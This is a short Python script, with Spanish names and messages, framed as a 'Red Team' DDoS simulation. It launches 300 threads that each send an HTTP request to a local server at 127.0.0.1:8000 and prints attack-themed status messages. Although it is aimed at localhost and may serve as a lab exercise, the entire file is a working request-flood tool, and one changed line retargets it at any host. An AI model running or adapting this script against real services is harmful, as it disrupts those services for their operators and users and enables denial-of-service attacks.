import threading
import urllib.request
import time

OBJETIVO = "http://127.0.0.1:8000/"
PETICIONES_SIMULTANEAS = 300

def lanzar_peticion():
    try:
        urllib.request.urlopen(OBJETIVO)
        print("[+] Rafaga HTTP enviada con exito.")
    except Exception:
        print("[-] El servidor rechazo la conexion. (Posible saturacion)")

print("==========================================")
print("   Iniciando simulacion Red Team: DDoS    ")
print("==========================================")
print(f"Objetivo: {OBJETIVO}")
print("Preparando cañones de red...\n")
time.sleep(2)

for i in range(PETICIONES_SIMULTANEAS):
    hilo = threading.Thread(target=lanzar_peticion)
    hilo.start()
    time.sleep(0.01)

print("\n[!] Ataque finalizado.")

